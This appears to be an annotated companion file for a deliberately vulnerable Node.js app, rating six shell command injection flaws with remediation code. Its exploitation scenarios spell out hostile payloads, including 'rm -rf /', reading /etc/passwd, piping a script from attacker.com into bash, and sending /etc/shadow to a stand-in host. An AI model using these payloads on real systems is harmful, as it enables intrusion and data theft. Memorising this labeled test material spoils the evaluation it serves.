# Security Companion Document: app.js

## Vulnerability: Direct Command Injection via exec in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L17  

### Description
The `/api/ping` route handler constructs a shell command by directly concatenating the user-supplied `host` query parameter into a string passed to `child_process.exec()`. The `host` value from `req.query.host` is appended to the command string without any sanitization or validation.

### Exploitation Scenario
An attacker sends `GET /api/ping?host=127.0.0.1;cat /etc/passwd`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents. More destructive payloads such as `; rm -rf /` or reverse shell commands could achieve full system compromise.

### Remediation Guidance
Use `child_process.execFile` with separate arguments to avoid shell interpretation:
```javascript
const { execFile } = require("child_process");
execFile("ping", ["-c", "3", host], { timeout: 10000 }, (err, stdout) => {
  res.json({ host, output: stdout });
});
```
Additionally, validate the `host` parameter against a hostname/IP regex pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from the query parameter into `exec()` with string concatenation, a textbook command injection pattern with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `child_process.exec()` with string concatenation is a well-known dangerous pattern that all major JavaScript SAST tools (eslint-plugin-security, NodeJsScan, Semgrep) flag reliably.

---

## Vulnerability: Shell Command Injection via exec in DNS Lookup

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L36-L37  

### Description
The `/api/dns/lookup` route handler constructs a shell command using a template literal to embed the `domain` query parameter into a `dig` command string, then executes it via `exec()`. Although the `recordType` is validated against an allowlist, the `domain` parameter is interpolated directly without sanitization.

### Exploitation Scenario
An attacker sends `GET /api/dns/lookup?domain=example.com;id`. The `domain` value is interpolated into the shell command as `` dig A example.com;id +short ``, causing the shell to execute both `dig` and `id`. The attacker can chain arbitrary commands after the semicolon.

### Remediation Guidance
Use `execFile` with separate arguments:
```javascript
execFile("dig", [safeType, domain, "+short"], { timeout: 10000 }, (err, stdout) => {
  res.json({ domain, type: safeType, result: stdout.trim() });
});
```

### Complexity Rationale
This is rated Moderate because the `recordType` parameter is validated against an allowlist, which may create a false sense of security. A reviewer must recognize that the `domain` parameter bypasses this validation and is directly interpolated into the shell command.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to recognize that template literal interpolation into `exec()` is dangerous even when one parameter is validated. The partial validation may cause some tools to reduce the severity.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L47-L51  

### Description
The `buildGrepCommand` helper function constructs a shell command using template literals that embed the `keyword` and `logPath` parameters into a `grep` command string. The `keyword` is wrapped in single quotes, but this provides no real protection since an attacker can break out of the quotes. The function is called from the `/api/logs/search` route handler, which passes user-controlled values for all parameters.

### Exploitation Scenario
An attacker sends `GET /api/logs/search?keyword=error'%3B%20id%20%23&file=syslog`. The single quote in the keyword breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. The `file` parameter can also be exploited via path traversal combined with command injection.

### Remediation Guidance
Use `execFile` with separate arguments and avoid shell interpretation:
```javascript
execFile("grep", ["-n", keyword, logPath], { timeout: 15000 }, (err, stdout) => {
  const matches = stdout.trim() ? stdout.trim().split("\n") : [];
  res.json({ file: logFile, matches });
});
```

### Complexity Rationale
This is rated Nuanced because the vulnerability is split across a helper function and a route handler, the single-quote wrapping creates a false appearance of sanitization, and the `logPath` is constructed using `path.join()` which may appear safe but does not prevent command injection when passed to a shell.

### Detection Difficulty Rationale
This is rated Likely_Missed because the vulnerability is in a helper function with pseudo-sanitization via single quotes. SAST tools need interprocedural analysis to track taint from `req.query` through the route handler into `buildGrepCommand` and back into `exec()`.

---

## Vulnerability: Command Injection via exec in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L99-L100  

### Description
The `/api/files/archive` route handler constructs a shell command using template literals to embed the `filePath` from the request body into a `tar` command, then executes it via `exec()`. While the `name` parameter undergoes sanitization via `sanitizeFilename()`, the `filePath` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker sends `POST /api/files/archive` with body `{"filePath": "/tmp/data; curl attacker.com/shell.sh | bash", "name": "backup"}`. The `filePath` value is interpolated into the `tar` command, and the shell executes the injected commands, achieving remote code execution.

### Remediation Guidance
Use `execFile` with argument lists:
```javascript
execFile("tar", ["czf", archivePath, filePath], { timeout: 30000 }, (err) => {
  res.json({ archive: archivePath });
});
```

### Complexity Rationale
This is rated Moderate because the vulnerability is partially obscured by the sanitization applied to the adjacent `name` parameter via `sanitizeFilename()`. A reviewer must recognize that `filePath` bypasses the sanitization.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the taint flows from `req.body` through destructuring into template literal interpolation and then to `exec()`. Tools need to track JSON body parameters through destructuring patterns.

---

## Vulnerability: Command Injection via exec in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L131  

### Description
The `/api/network/check` route handler constructs a shell command using a template literal to embed the `host` parameter into a `nc` (netcat) command, then executes it via `exec()`. While the `port` parameter undergoes integer parsing and range validation, the `host` parameter from the request body is embedded directly without sanitization.

### Exploitation Scenario
An attacker sends `POST /api/network/check` with body `{"host": "127.0.0.1; whoami", "port": 80}`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`.

### Remediation Guidance
Use `execFile` with argument lists:
```javascript
execFile("nc", ["-zv", "-w", "3", host, String(portNum)], { timeout: 10000 }, (err, stdout, stderr) => {
  res.json({ host, port: portNum, result: (stderr || stdout).trim() });
});
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has proper integer validation, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from `req.body` to `exec()` with template literal interpolation is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Command Injection via Complex Shell Pipeline in Certificate Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L142  

### Description
The `/api/certs/check` route handler constructs a complex shell pipeline using a template literal that embeds `hostname` three times into an `openssl` command chain. The command pipes through `echo`, `openssl s_client`, and `openssl x509` with shell redirections. The `hostname` from `req.body` is interpolated without sanitization into multiple positions.

### Exploitation Scenario
An attacker sends `POST /api/certs/check` with body `{"hostname": "example.com;curl attacker.com/exfil?data=$(cat /etc/shadow)"}`. The injected command is executed by the shell, exfiltrating sensitive data.

### Remediation Guidance
Validate the hostname against a strict pattern:
```javascript
if (!/^[a-zA-Z0-9.-]+$/.test(hostname)) {
  return res.status(400).json({ error: "Invalid hostname" });
}
```
Or use a Node.js TLS library to check certificates programmatically.

### Complexity Rationale
This is rated Nuanced because the vulnerability is embedded within a complex multi-stage shell pipeline with redirections and multiple interpolation points. The `openssl` command chain appears to be a legitimate system administration operation.

### Detection Difficulty Rationale
This is rated Likely_Missed because the complex shell pipeline with multiple pipes, redirections, and `/dev/null` references makes it difficult for SAST tools to parse and analyze. The `hostname` parameter appears in three positions within the template literal.
